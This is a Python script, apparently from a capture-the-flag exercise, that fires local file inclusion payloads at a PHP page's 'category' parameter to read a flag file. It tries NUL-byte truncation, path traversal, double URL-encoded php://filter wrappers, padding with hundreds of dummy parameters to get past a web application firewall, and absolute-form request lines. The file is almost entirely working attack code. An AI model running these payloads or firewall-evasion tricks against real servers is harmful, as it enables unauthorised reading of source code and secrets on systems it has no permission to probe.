"""Round 12: NUL include check, double-decode check, param-count WAF check."""
import re
import urllib.parse
import urllib.request
import http.client

BASE = "http://noctf.fa1lsnow.com:40547/index.php?category="
HOST, PORT = "noctf.fa1lsnow.com", 40547


def fetch(qs):
    req = urllib.request.Request(BASE + qs, headers={"User-Agent": "probe"})
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", repr(e)


def show(label, qs):
    st, body = fetch(qs)
    note = ""
    if isinstance(body, str):
        m = re.search(r'<div class="page-include">(.*?)</div>', body, re.S)
        if m:
            note = re.sub(r"\s+", " ", m.group(1)).strip()[:300]
        if "Sorry" in body:
            note += " [SORRY]"
        if "Warning" in body:
            wm = re.search(r"include\([^)]{0,160}", body)
            note += " [WARN: " + (wm.group(0) if wm else "?") + "]"
    print(f"[{st}] {label}\n      {note}\n")


# Q1: NUL truncation -> include non-php file that definitely exists
show("Q1 css/style.css%00", "woofers/../css/style.css%00")
show("Q1b js/material.min.js%00", "woofers/../js/material.min.js%00")

# Q9: double-decode check (app calls urldecode() again?)
show("Q9 doubled woofers%252F..%252Fflag", "woofers%252F..%252Fflag")
show("Q9b doubled+php wrapper php%253A%252F%252Ffilter.../resource%253Dflag",
     "%70hp%253A%252F%252Ffilter%252Fconvert.base64-encode%252Fresource%253Dwoofers%252F..%252Fflag")

# Q2: dummy params before category (WAF inspection cap?)
for n in (10, 30, 60, 100, 200):
    dummies = "&".join(f"d{i}=1" for i in range(n))
    qs = f"?{dummies}&category=" + urllib.parse.quote(
        "php://filter/convert.base64-encode/resource=woofers/../flag", safe="")
    req = urllib.request.Request("http://noctf.fa1lsnow.com:40547/index.php" + qs, headers={"User-Agent": "probe"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            st, body = r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        st, body = e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        st, body = "ERR", repr(e)
    has_b64 = "PD9waHA" in (body if isinstance(body, str) else "")
    print(f"[{st}] Q2 dummy-params={n} -> {'BASE64!!!' if has_b64 else ('blocked/reset' if st in (502, 'ERR') else 'other')}")

# Q4: absolute-form request URI (raw socket)
try:
    conn = http.client.HTTPConnection(HOST, PORT, timeout=8)
    conn.putrequest("GET", "http://noctf.fa1lsnow.com:40547/index.php?category=" + urllib.parse.quote(
        "php://filter/convert.base64-encode/resource=woofers/../flag", safe=""), skip_host=True, skip_accept_encoding=True)
    conn.putheader("Host", HOST)
    conn.endheaders()
    r = conn.getresponse()
    body = r.read().decode("utf-8", "replace")
    print("[Q4] absolute-form status:", r.status, "| b64:", "PD9waHA" in body, "| head:", re.sub(r"\s+", " ", body)[:200])
    conn.close()
except Exception as e:  # noqa: BLE001
    print("[Q4] absolute-form error:", repr(e))
